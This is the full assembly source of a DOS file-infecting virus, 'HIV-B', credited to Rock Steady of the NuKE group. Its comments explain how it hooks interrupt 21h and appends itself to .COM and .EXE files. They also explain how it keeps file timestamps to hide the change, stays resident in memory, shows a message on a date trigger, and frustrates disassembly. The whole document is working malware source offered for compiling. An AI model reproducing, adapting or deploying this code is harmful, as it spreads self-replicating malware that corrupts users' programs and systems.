

DATA_1E          EQU     4CH           ; Just a Few Data Segments that are
DATA_3E          EQU     84H           ; Needed for the virus to find some
DATA_5E          EQU     90H           ; hard core info...
DATA_7E          EQU     102H
DATA_8E          EQU     106H
DATA_9E          EQU     122H
DATA_10E         EQU     124H
DATA_11E         EQU     15AH
DATA_12E         EQU     450H
DATA_13E         EQU     462H
DATA_14E         EQU     47BH
DATA_15E         EQU     0
DATA_16E         EQU     1
DATA_17E         EQU     2
DATA_18E         EQU     6
DATA_42E         EQU     0FB2CH
DATA_43E         EQU     0FB2EH
DATA_44E         EQU     0FB4BH
DATA_45E         EQU     0FB4DH
DATA_46E         EQU     0FB83H
DATA_47E         EQU     0FB8DH
DATA_48E         EQU     0FB8FH
DATA_49E         EQU     0FB95H
DATA_50E         EQU     0FB97H
DATA_51E         EQU     0
DATA_52E         EQU     2

SEG_A            SEGMENT BYTE PUBLIC
                 ASSUME  CS:SEG_A, DS:SEG_A


                 ORG     100h                  ; Compile this to a .COM file!
                                              ; So the Virus starts at 0100h
HIV              PROC    FAR

START:
                 JMP     LOC_35
                 DB      0C3H
                 DB      23 DUP (0C3H)
                 DB      61H, 6EH, 74H, 69H, 64H, 65H
                 DB      62H, 0C3H, 0C3H, 0C3H, 0C3H
                 DB      'HIV-B Virus - Release 1.1 [NukE]'
                 DB      ' '
copyright        DB      '(C) Edited by Rock Steady [NukE]'
                 DB      0, 0
DATA_24          DW      0
DATA_25          DW      0
DATA_26          DW      0
DATA_27          DW      706AH
DATA_28          DD      00000H
DATA_29          DW      0
DATA_30          DW      706AH
DATA_31          DD      00000H
DATA_32          DW      0
DATA_33          DW      706AH
DATA_34          DB      'HIV-B VIRUS - Release 1.1 [NukE]', 0AH, 0DH
                 DB      'Edited by Rock Steady [NukE]', 0AH, 0DH
                 DB      '(C) 1991 Italian Virus Laboratory', 0AH, 0DH
                 DB      '$'
                 DB      0E8H, 83H, 3, 3DH, 4DH, 4BH
                 DB      75H, 9, 55H, 8BH, 0ECH, 83H
                 DB      66H, 6, 0FEH, 5DH, 0CFH, 80H
                 DB      0FCH, 4BH, 74H, 12H, 3DH, 0
                 DB      3DH, 74H, 0DH, 3DH, 0, 6CH
                 DB      75H, 5, 80H, 0FBH, 0, 74H
                 DB      3
LOC_1:
                 JMP     LOC_13
LOC_2:
                 PUSH    ES               ; Save All Regesters so that when
                 PUSH    DS               ; we restore the program it will
                 PUSH    DI               ; RUN correctly and hide the fact
                 PUSH    SI               ; that any Virii is tampering with
                 PUSH    BP               ; the System....
                 PUSH    DX
                 PUSH    CX
                 PUSH    BX
                 PUSH    AX
                 CALL    SUB_6
                 CALL    SUB_7
                 CMP     AX,6C00H
                 JNE     LOC_3                   ; Jump if not equal
                 MOV     DX,SI
LOC_3:
                 MOV     CX,80H
                 MOV     SI,DX

LOCLOOP_4:
                 INC     SI                      ; Slowly down the System a
                 MOV     AL,[SI]                 ; little.
                 OR      AL,AL                   ; Zero ?
                 LOOPNZ  LOCLOOP_4               ; Loop if zf=0, cx>0

                 SUB     SI,2
                 CMP     WORD PTR [SI],4D4FH
                 JE      LOC_7                   ; Jump if equal
                 CMP     WORD PTR [SI],4558H
                 JE      LOC_6                   ; Jump if equal
LOC_5:
                 JMP     SHORT LOC_12            ;
                 DB      90H
LOC_6:
                 CMP     WORD PTR [SI-2],452EH
                 JE      LOC_8                   ; Jump if equal
                 JMP     SHORT LOC_5             ;
LOC_7:
                 NOP
                 CMP     WORD PTR [SI-2],432EH
                 JNE     LOC_5                   ; Jump if not equal
LOC_8:
                 MOV     AX,3D02H
                 CALL    SUB_5
                 JC      LOC_12                  ; Jump if carry Set
                 MOV     BX,AX
                 MOV     AX,5700H
                 CALL    SUB_5                   ; Initsilize the virus...
                 MOV     CS:DATA_24,CX           ; A Basic Start up to check
                 MOV     CS:DATA_25,DX           ; The Interrup 21h
                 MOV     AX,4200H
                 XOR     CX,CX
                 XOR     DX,DX
                 CALL    SUB_5
                 PUSH    CS
                 POP     DS
                 MOV     DX,103H
                 MOV     SI,DX
                 MOV     CX,18H
                 MOV     AH,3FH
                 CALL    SUB_5
                 JC      LOC_10                  ; Jump if carry Set
                 CMP     WORD PTR [SI],5A4DH
                 JNE     LOC_9                   ; Jump if not equal
                 CALL    SUB_1
                 JMP     SHORT LOC_10
LOC_9:
                 CALL    SUB_4
LOC_10:
                 JC      LOC_11                  ; Jump if carry Set
                 MOV     AX,5701H
                 MOV     CX,CS:DATA_24
                 MOV     DX,CS:DATA_25
                CALL     SUB_5
LOC_11:
                 MOV     AH,3EH                  ; '>'
                 CALL    SUB_5
LOC_12:
                 CALL    SUB_7
                 POP     AX                      ; A Stealth Procedure to
                 POP     BX                      ; end the virus and restore
                 POP     CX                      ; the program! Pup back all
                 POP     DX                      ; regesters as we found them!
                 POP     BP                      ; so nothings changed...
                 POP     SI
                 POP     DI
                 POP     DS
                 POP     ES
LOC_13:
                 JMP     CS:DATA_28
                 DB      0B4H, 2AH, 0CDH, 21H, 0C3H

HIV              ENDP

;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;*-                             SUBROUTINE                                *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

SUB_1            PROC    NEAR                    ; Start of the Virus!
                 MOV     AH,2AH                  ; Get the Date system Date!
                 INT     21H                     ; If its Friday Display the
                                                 ; message at Data34 and End!
                CMP      AL,6
                 JE      LOC_15                  ; If Friday display message
                 JNZ     LOC_14                  ; If not continue infecting
LOC_14:                                         ; and screwing the system!
                 MOV     CX,[SI+16H]
                 ADD     CX,[SI+8]
                 MOV     AX,10H
                 MUL     CX                      ; dx:ax = reg * ax
                 ADD     AX,[SI+14H]
                 ADC     DX,0
                 PUSH    DX
                 PUSH    AX
                 MOV     AX,4202H
                 XOR     CX,CX                   ; Zero register
                 XOR     DX,DX                   ; Zero register
                 CALL    SUB_5
                 CMP     DX,0
                 JNE     LOC_16                  ; Jump if not equal
                 CMP     AX,64EH
                 JAE     LOC_16                  ; Jump if above or =
                 POP     AX
                 POP     DX
                 STC                             ; Set carry flag
                 RETN
LOC_15:
                 MOV     DX,OFFSET DATA_34+18H   ; Display Message at Data34!
                 MOV     AH,9                    ; With New Offset Address in
                 INT     21H                     ; memory!
                                                 ;
                 POP     AX                      ; Restore all Regesters as if
                 POP     BX                      ; nothing was changed and exit
                 POP     CX                      ; virus and run File...
                 POP     DX
                 POP     SI
                 POP     DI
                 POP     BP
                 POP     DS
                 POP     ES
                 MOV     AH,0                    ; Exit Virus if your in a .EXE
                 INT     21H                     ; File!!!
                                                 ; Exit virus if your in a .COM
                 INT     20H                     ; File!!!
LOC_16:
                 MOV     DI,AX
                 MOV     BP,DX
                 POP     CX
                 SUB     AX,CX
                 POP     CX
                 SBB     DX,CX
                 CMP     WORD PTR [SI+0CH],0
                 JE      LOC_RET_19              ; Jump if equal
                 CMP     DX,0
                 JNE     LOC_17                  ; Jump if not equal
                 CMP     AX,64EH
                 JNE     LOC_17                  ; Jump if not equal
                 STC                             ; Set carry flag
                 RETN
LOC_17:
                 MOV     DX,BP
                 MOV     AX,DI
                 PUSH    DX
                 PUSH    AX
                 ADD     AX,64EH
                 ADC     DX,0
                 MOV     CX,200H
                 DIV     CX                      ; Find out How much System
                 LES     DI,DWORD PTR [SI+2]     ; memory is available...
                 MOV     CS:DATA_26,DI           ;
                 MOV     CS:DATA_27,ES           ; Every so often make the
                 MOV     [SI+2],DX               ; system memory small than
                 CMP     DX,0                    ; what it already is...
                 JE      LOC_18                  ; Screws up the users hehe
                 INC     AX
LOC_18:
                 MOV     [SI+4],AX
                 POP     AX
                 POP     DX
                 CALL    SUB_2
                 SUB     AX,[SI+8]
                 LES     DI,DWORD PTR [SI+14H]
                 MOV     DS:DATA_9E,DI
                 MOV     DS:DATA_10E,ES
                 MOV     [SI+14H],DX             ; Tie up some memory!
                 MOV     [SI+16H],AX             ; release it on next execution
                 MOV     DS:DATA_11E,AX          ; Jump to su routine to do
                 MOV     AX,4202H                ; this and disable interrups
                 XOR     CX,CX
                 XOR     DX,DX
                 CALL    SUB_5
                 CALL    SUB_3
                 JC      LOC_RET_19
                 MOV     AX,4200H
                 XOR     CX,CX                   ; Zero register
                 XOR     DX,DX                   ; Zero register
                 CALL    SUB_5
                 MOV     AH,40H
                 MOV     DX,SI
                 MOV     CX,18H
                 CALL    SUB_5
LOC_RET_19:
                 RETN
SUB_1            ENDP


;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;*-                            SUBROUTINE                                *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

SUB_2            PROC    NEAR
                 MOV     CX,4
                 MOV     DI,AX
                 AND     DI,0FH

LOCLOOP_20:
                 SHR     DX,1                    ; Shift w/zeros fill
                 RCR     AX,1                    ; Rotate thru carry
                 LOOP    LOCLOOP_20              ; Loop if cx > 0

                 MOV     DX,DI
                 RETN
SUB_2            ENDP


;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;*-                             SUBROUTINE                                *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

SUB_3            PROC    NEAR
                 MOV     AH,40H
                 MOV     CX,64EH
                 MOV     DX,100H
                 CALL    SUB_6
                 JMP     SHORT LOC_24
                 DB      90H

;*-*- External Entry into Subroutine -*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

SUB_4:
                 MOV     AX,4202H
                 XOR     CX,CX                   ; Zero register
                 XOR     DX,DX                   ; Zero register
                 CALL    SUB_5
                 CMP     AX,64EH
                 JB      LOC_RET_23              ; Jump if below
                 CMP     AX,0FA00H
                 JAE     LOC_RET_23              ; Jump if above or =
                 PUSH    AX
                 CMP     BYTE PTR [SI],0E9H
                 JNE     LOC_21                  ; Jump if not equal
                 SUB     AX,651H
                 CMP     AX,[SI+1]
                 JNE     LOC_21                  ; Jump if not equal
                 POP     AX
                 STC                             ; Set carry flag
                 RETN
LOC_21:
                 CALL    SUB_3
                 JNC     LOC_22                  ; Jump if carry=0
                 POP     AX
                 RETN
LOC_22:
                 MOV     AX,4200H
                 XOR     CX,CX                   ; Zero register
                 XOR     DX,DX                   ; Zero register
                 CALL    SUB_5
                 POP     AX
                 SUB     AX,3
                 MOV     DX,122H
                 MOV     SI,DX
                 MOV     BYTE PTR CS:[SI],0E9H
                 MOV     CS:[SI+1],AX
                 MOV     AH,40H
                 MOV     CX,3
                 CALL    SUB_5

LOC_RET_23:
                 RETN
SUB_3            ENDP


;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;*-                             SUBROUTINE                                *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

SUB_5            PROC    NEAR
LOC_24:
                 PUSHF                           ; Push flags
                 CALL    CS:DATA_28
                 RETN
SUB_5            ENDP


;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;*-                             SUBROUTINE                                *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

SUB_6            PROC    NEAR
                 PUSH    AX
                 PUSH    DS
                 PUSH    ES
                 XOR     AX,AX                   ; Zero register
                 PUSH    AX
                 POP     DS
                 CLI                             ; Disable the interrupts
                 LES     AX,DWORD PTR DS:DATA_5E ; This Copies the Virus
                 MOV     CS:DATA_29,AX           ; to the COM File...
                 MOV     CS:DATA_30,ES
                 MOV     AX,46AH
                MOV      DS:DATA_5E,AX
                 MOV     WORD PTR DS:DATA_5E+2,CS
                 LES     AX,DWORD PTR DS:DATA_1E ; Loads 32Bit word..
                 MOV     CS:DATA_32,AX           ; get your info needed on
                MOV      CS:DATA_33,ES           ; System...
                 LES     AX,CS:DATA_31
                 MOV     DS:DATA_1E,AX
                 MOV     WORD PTR DS:DATA_1E+2,ES
                 STI                             ; Enable the interrupts
                 POP     ES                      ; and restore regesters!
                 POP     DS                      ; go back to the file
                 POP     AX                      ; being executed...
                 RETN
SUB_6            ENDP


;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;*-                             SUBROUTINE                                *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

SUB_7            PROC    NEAR
                 PUSH    AX
                 PUSH    DS
                 PUSH    ES
                 XOR     AX,AX                   ; Zero register
                 PUSH    AX
                 POP     DS
                 CLI                             ; Disable interrupts
                 LES     AX,DWORD PTR CS:DATA_29 ; same as Sub_6 just copy
                 MOV     DS:DATA_5E,AX           ; yourself to the EXE
                 MOV     WORD PTR DS:DATA_5E+2,ES
                 LES     AX,DWORD PTR CS:DATA_32
                 MOV     DS:DATA_1E,AX
                 MOV     WORD PTR DS:DATA_1E+2,ES
                 STI                             ; Enable interrupts
                 POP     ES
                 POP     DS
                 POP     AX
                 RETN
SUB_7            ENDP

                 DB      0B0H, 3, 0CFH, 50H, 53H, 51H
                 DB      52H, 56H, 57H, 55H, 1EH, 6
                 DB      33H, 0C0H, 50H, 1FH, 8AH, 3EH
                 DB      62H, 4, 0A1H, 50H, 4, 2EH
                 DB      0A3H, 0CEH, 4, 2EH, 0A1H, 0C7H
                 DB      4, 0A3H, 50H, 4, 2EH, 0A1H
                 DB      0C5H, 4, 8AH, 0DCH, 0B4H, 9
                 DB      0B9H, 1, 0, 0CDH, 10H, 0E8H
                 DB      34H, 0, 0E8H, 0B7H, 0, 2EH
                 DB      0A1H, 0C7H, 4, 0A3H, 50H, 4
                 DB      0B3H, 2, 0B8H, 2, 9, 0B9H
                 DB      1, 0, 0CDH, 10H, 2EH, 0A1H
                 DB      0CEH, 4, 0A3H, 50H, 4, 7
                 DB      1FH
                 DB      ']_^ZY[X.'
                 DB      0FFH, 2EH, 0CAH, 4
DATA_36          DW      0
DATA_37          DW      1010H
DATA_39          DB      0
DATA_40          DD      706A0000H
                 DB      0, 0, 2EH, 0A1H, 0C7H, 4
                 DB      8BH, 1EH, 4AH, 4, 4BH, 2EH
                 DB      0F6H, 6, 0C9H, 4, 1, 74H
                 DB      0CH, 3AH, 0C3H, 72H, 12H, 2EH
                 DB      80H, 36H, 0C9H, 4, 1, 0EBH
                 DB      0AH
LOC_25:
                 CMP     AL,0
                 JG      LOC_26                  ; Jump if >
                 XOR     CS:DATA_39,1
LOC_26:
                 TEST    CS:DATA_39,2
                 JZ      LOC_27                  ; Jump if zero
                 CMP     AH,18H
                 JB      LOC_28                  ; Jump if below
                 XOR     CS:DATA_39,2
                 JMP     SHORT LOC_28
LOC_27:
                 CMP     AH,0
                 JG      LOC_28                  ; Jump if >
                 XOR     CS:DATA_39,2
LOC_28:
                 CMP     BYTE PTR CS:DATA_36,20H
                 JE      LOC_29                  ; Jump if equal
                 CMP     BYTE PTR CS:DATA_37+1,0
                 JE      LOC_29                  ; Jump if equal
                 XOR     CS:DATA_39,2
LOC_29:
                 TEST    CS:DATA_39,1
                 JZ      LOC_30                  ; Jump if zero
                 INC     BYTE PTR CS:DATA_37
                 JMP     SHORT LOC_31
LOC_30:
                 DEC     BYTE PTR CS:DATA_37     ; (706A:04C7=10H)
LOC_31:
                 TEST    CS:DATA_39,2            ; (706A:04C9=0)
                 JZ      LOC_32                  ; Jump if zero
                 INC     BYTE PTR CS:DATA_37+1   ; (706A:04C8=10H)
                 JMP     SHORT LOC_RET_33        ; (0555)
LOC_32:
                 DEC     BYTE PTR CS:DATA_37+1   ; (706A:04C8=10H)

LOC_RET_33:
                 RETN

;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;*-                             SUBROUTINE                                *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

SUB_8            PROC    NEAR
                 MOV     AX,CS:DATA_37
                 MOV     DS:DATA_12E,AX         ; Get info on type of Video
                 MOV     BH,DS:DATA_13E         ; Display the system has...
                MOV      AH,8
                 INT     10H                    ; with ah=functn 08h
                                               ; basically fuck the cursur..
                 MOV     CS:DATA_36,AX
                 RETN
SUB_8            ENDP

                 DB      50H, 53H, 51H, 52H, 56H, 57H
                 DB      55H, 1EH, 6, 33H, 0C0H, 50H
                 DB      1FH, 81H, 3EH, 70H, 0, 6DH
                 DB      4, 74H, 35H, 0A1H, 6CH, 4
                 DB      8BH, 16H, 6EH, 4, 0B9H, 0FFH
                 DB      0FFH, 0F7H, 0F1H, 3DH, 10H, 0
                 DB      75H, 24H, 0FAH, 8BH, 2EH, 50H
                 DB      4, 0E8H, 0BEH, 0FFH, 89H, 2EH
                 DB      50H, 4, 0C4H, 6, 70H, 0
                 DB      2EH, 0A3H, 0CAH, 4, 2EH, 8CH
                 DB      6, 0CCH, 4, 0C7H, 6, 70H
                 DB      0, 6DH, 4, 8CH, 0EH, 72H
                 DB      0, 0FBH
LOC_34:
                 POP     ES
                 POP     DS                  ; Restore and get lost...
                 POP     BP
                 POP     DI
                 POP     SI
                 POP     DX
                 POP     CX
                 POP     BX
                 POP     AX
                 RETN

;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;*-                             SUBROUTINE                                *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
SUB_9            PROC    NEAR
                 MOV     DX,10H
                 MUL     DX                      ; dx:ax = reg * ax
                 RETN
SUB_9            ENDP


;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;*-                             SUBROUTINE                                *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

SUB_10           PROC    NEAR
                 XOR     AX,AX                   ; If if wants to dissamble
                 XOR     BX,BX                   ; us give him a HARD time...
                 XOR     CX,CX                   ; By making all into 0
                 XOR     DX,DX                   ; Zero register
                XOR      SI,SI                   ; Zero register
                 XOR     DI,DI                   ; Zero register
                 XOR     BP,BP                   ; Zero register
                 RETN
SUB_10           ENDP

LOC_35:
                 PUSH    DS
                 CALL    SUB_11

;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;*-                             SUBROUTINE                                *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

SUB_11           PROC    NEAR
                 MOV     AX,4B4DH
                 INT     21H                     ; Load and EXEC file...
                                                 ; be runned...
                 NOP
                 JC      LOC_36                  ; Jump if carry Set
                 JMP     LOC_46
LOC_36:
                 POP     SI
                 PUSH    SI
                 MOV     DI,SI
                 XOR     AX,AX                   ; Zero register
                 PUSH    AX
                 POP     DS
                 LES     AX,DWORD PTR DS:DATA_1E ; Load 32 bit ptr
                 MOV     CS:DATA_49E[SI],AX      ; Move lots of data
                 MOV     CS:DATA_50E[SI],ES      ; into CS to infect the file
                 LES     BX,DWORD PTR DS:DATA_3E ; if not infected and shit..
                 MOV     CS:DATA_47E[DI],BX
                 MOV     CS:DATA_48E[DI],ES
                 MOV     AX,DS:DATA_7E
                 CMP     AX,0F000H
                 JNE     LOC_44                  ; Jump if not equal
                 MOV     DL,80H
                 MOV     AX,DS:DATA_8E
                 CMP     AX,0F000H
                 JE      LOC_37                  ; Jump if equal
                 CMP     AH,0C8H
                 JB      LOC_44                  ; Jump if below
                 CMP     AH,0F4H
                 JAE     LOC_44                  ; Jump if above or =
                 TEST    AL,7FH
                 JNZ     LOC_44                  ; Jump if not zero
                 MOV     DS,AX
                 CMP     WORD PTR DS:DATA_51E,0AA55H
                 JNE     LOC_44                  ; Jump if not equal
                 MOV     DL,DS:DATA_52E
LOC_37:
                 MOV     DS,AX
                 XOR     DH,DH                   ; Zero register
                 MOV     CL,9
                 SHL     DX,CL                   ; Shift w/zeros fill
                 MOV     CX,DX
                 XOR     SI,SI                   ; Zero register

LOCLOOP_38:
                 LODSW                           ; String [si] to ax
                 CMP     AX,0FA80H
                 JNE     LOC_39                  ; Jump if not equal
                 LODSW                           ; String [si] to ax
                 CMP     AX,7380H
                 JE      LOC_40                  ; Jump if equal
                 JNZ     LOC_41                  ; Jump if not zero
LOC_39:
                 CMP     AX,0C2F6H
                 JNE     LOC_42                  ; Jump if not equal
                 LODSW                           ; String [si] to ax
                 CMP     AX,7580H
                 JNE     LOC_41                  ; Jump if not equal
LOC_40:
                 INC     SI
                 LODSW                           ; String [si] to ax
                 CMP     AX,40CDH
                 JE      LOC_43                  ; Jump if equal
                 SUB     SI,3
LOC_41:
                 DEC     SI
                 DEC     SI
LOC_42:
                 DEC     SI
                 LOOP    LOCLOOP_38              ; Loop if cx > 0

                 JMP     SHORT LOC_44
LOC_43:
                 SUB     SI,7
                 MOV     CS:DATA_49E[DI],SI
                 MOV     CS:DATA_50E[DI],DS
LOC_44:
                 MOV     AH,62H
                 INT     21H                     ; Simple...Get the PSP
                                                 ; Address (Program segment
                MOV      ES,BX                   ; address and but in BX)
                 MOV     AH,49H
                 INT     21H                     ; Get the Free memory from
                                                 ; the system
                 MOV     BX,0FFFFH               ; release extra memory blocks
                 MOV     AH,48H
                 INT     21H                     ; Allocate the memory
                                                 ; At BX (# bytes)
                 SUB     BX,66H                  ; it attaches virus right
                 NOP                             ; under the 640k
                 JC      LOC_46
                 MOV     CX,ES                   ; did it work? If not just
                 STC                             ; end the virus...
                 ADC     CX,BX
                 MOV     AH,4AH
                 INT     21H                     ; Adjust teh memory block
                                                 ; size! BX has the # of bytes
                 MOV     BX,65H
                 STC                             ; Set carry flag
                 SBB     ES:DATA_17E,BX          ; Where to attach itself!
                 PUSH    ES                      ; under 640K
                 MOV     ES,CX
                 MOV     AH,4AH
                 INT     21H                     ; Just change the memory
                                                 ; allocations! (BX=Btyes Size)
                 MOV     AX,ES
                 DEC     AX
                 MOV     DS,AX
                 MOV     WORD PTR DS:DATA_16E,8  ;Same place under 640k
                 CALL    SUB_9
                MOV      BX,AX
                 MOV     CX,DX
                 POP     DS
                 MOV     AX,DS
                 CALL    SUB_9
                 ADD     AX,DS:DATA_18E
                 ADC     DX,0
                 SUB     AX,BX
                 SBB     DX,CX
                 JC      LOC_45                  ; Jump if carry Set
                 SUB     DS:DATA_18E,AX
LOC_45:
                 MOV     SI,DI
                 XOR     DI,DI                   ; Zero register
                 PUSH    CS
                 POP     DS
                 SUB     SI,4D7H
                 MOV     CX,64EH
                 INC     CX
                REP     MOVSB                   ; Rep when cx >0 Mov [si] to
                MOV     AH,62H                  ; es:[di]
                 INT     21H                     ; Get the Program segment
                                                 ; prefix...so we can infect it
                DEC      BX
                 MOV     DS,BX
                 MOV     BYTE PTR DS:DATA_15E,5AH
                 MOV     DX,1E4H
                 XOR     AX,AX                   ; Zero register
                 PUSH    AX
                 POP     DS
                 MOV     AX,ES
                 SUB     AX,10H
                 MOV     ES,AX
                 CLI                             ; Disable interrupts
                 MOV     DS:DATA_3E,DX           ;
                 MOV     WORD PTR DS:DATA_3E+2,ES
                 STI                             ; Enable interrupts
                 DEC     BYTE PTR DS:DATA_14E    ;
LOC_46:
                 POP     SI
                 CMP     WORD PTR CS:DATA_42E[SI],5A4DH
                 JNE     LOC_47                  ; Jump if not equal
                 POP     DS
                 MOV     AX,CS:DATA_46E[SI]
                 MOV     BX,CS:DATA_45E[SI]      ; all this shit is to restore
                 PUSH    CS                      ; the program and continue
                 POP     CX                      ; running the original
                 SUB     CX,AX                   ; program...
                 ADD     CX,BX
                 PUSH    CX
                 PUSH    WORD PTR CS:DATA_44E[SI]
                 PUSH    DS
                 POP     ES
                 CALL    SUB_10
                 RETF
LOC_47:
                 POP     AX
                 MOV     AX,CS:DATA_42E[SI]
                 MOV     WORD PTR CS:[100H],AX
                 MOV     AX,CS:DATA_43E[SI]
                 MOV     WORD PTR CS:[102H],AX
                 MOV     AX,100H
                 PUSH    AX
                 PUSH    CS
                 POP     DS
                 PUSH    DS
                 POP     ES
                 CALL    SUB_10
                RETN
SUB_11           ENDP


SEG_A            ENDS



                 END     START




 Rock Steady [NuKE]
